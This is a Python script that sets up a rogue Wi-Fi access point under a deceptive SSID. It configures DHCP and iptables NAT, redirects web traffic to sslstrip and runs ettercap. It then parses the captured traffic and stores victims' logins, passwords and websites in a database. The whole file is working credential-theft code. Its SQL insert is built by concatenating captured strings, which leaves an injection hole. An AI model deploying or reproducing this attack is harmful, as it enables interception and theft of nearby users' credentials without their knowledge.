#!/usr/bin/python

import os
import subprocess
import time
from monitor_management import *
from database import *


def configure_dhcp():
	os.system("echo dhcp")
	os.system("sudo rm /etc/dhcp/dhcpd.conf")
	os.system("sudo touch /etc/dhcp/dhcpd.conf")
	os.system("sudo echo 'option domain-name \"home\";' >> /etc/dhcp/dhcpd.conf")
	os.system("sudo echo 'default-lease-time 600;' >> /etc/dhcp/dhcpd.conf")
	os.system("sudo echo 'max-lease-time 7200;' >> /etc/dhcp/dhcpd.conf")
	os.system("sudo echo 'ddns-update-style none;' >> /etc/dhcp/dhcpd.conf")
	os.system("sudo echo 'authoritative;' >> /etc/dhcp/dhcpd.conf")
	os.system("sudo echo 'subnet 192.168.254.0 netmask 255.255.255.0' { >> /etc/dhcp/dhcpd.conf")
	os.system("sudo echo 'option subnet-mask 255.255.255.0;' >> /etc/dhcp/dhcpd.conf")
	os.system("sudo echo 'option broadcast-address 192.168.254.255;' >> /etc/dhcp/dhcpd.conf")
	os.system("sudo echo 'option routers 192.168.254.1;' >> /etc/dhcp/dhcpd.conf")
	os.system("sudo echo 'option domain-name-servers 8.8.8.8;' >> /etc/dhcp/dhcpd.conf")
	os.system("sudo echo 'range 192.168.254.2 192.168.254.90;' >> /etc/dhcp/dhcpd.conf")
	os.system("sudo echo '}' >> /etc/dhcp/dhcpd.conf")

def make_mon():
	os.system("echo mon")
	start_monitor("wlan0")
	command= ["sudo","airbase-ng", "-e"]
	command.append("wifi4rudi_super_legit")
	command.append("-c")
	command.append("9")
	command.append("mon0")
	print(command)
	sub= subprocess.Popen(command)
	
def configure_firewall():
	os.system("echo firewall")
	os.system("sudo iptables --flush")
	os.system("sudo iptables --table nat --flush")
	os.system("sudo iptables --delete-chain")
	os.system("sudo iptables --table nat --delete-chain")
	os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
	os.system("sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
	os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000")

def setroute():
	os.system("echo route")
	os.system("sudo ifconfig at0 up")
	os.system("sudo ifconfig at0 192.168.254.1 netmask 255.255.255.0")
	os.system("/sbin/route add -net 192.168.254.0 netmask 255.255.255.0 gw 192.168.254.1")
	os.system("dhcpd at0")
	os.system("sudo service isc-dhcp-server restart")
	os.system("dhcpd at0")
def runettercap():
	os.system("echo ettercap")
	command=['sudo', "ettercap", "-T", "-q", "-i" "at0"]
	file= open("/home/isis/etterout","w")
	sub= subprocess.Popen(command,stdout=file)
	time.sleep(5)

def runsslstrip():
	os.system("echo sslstrip")
	command=['sudo', "sslstrip", "-a", "-k", "-f"]
	sub= subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	time.sleep(5)

def stop_mon():
	os.system("sudo killall dhcpd")
	os.system("sudo reboot")

def read_post_file():
	file=open ("/home/isis/etterout","r")
	for line in file:
		if "http" in line:
			lineparts = line.split(" ")
			query = "insert into passwords (login,password,website) values\n ('"
			query += lineparts[5]
			query += "','"
			query += lineparts[8]
			query += "','"
			query += lineparts[11]
			query += "');"
			try:
				executequery(query)
			except:
				pass
def remove_file():
	os.system("echo top kek") 
	
def start_rogue_ap():
	configure_dhcp()
	make_mon()
	configure_firewall()
	setroute()
	runettercap()
	runsslstrip()
	configure_firewall()

def stop_rogue_ap():
	read_post_file()
	remove_file()
	stop_mon()

if __name__ == '__main__':
	start_rogue_ap()

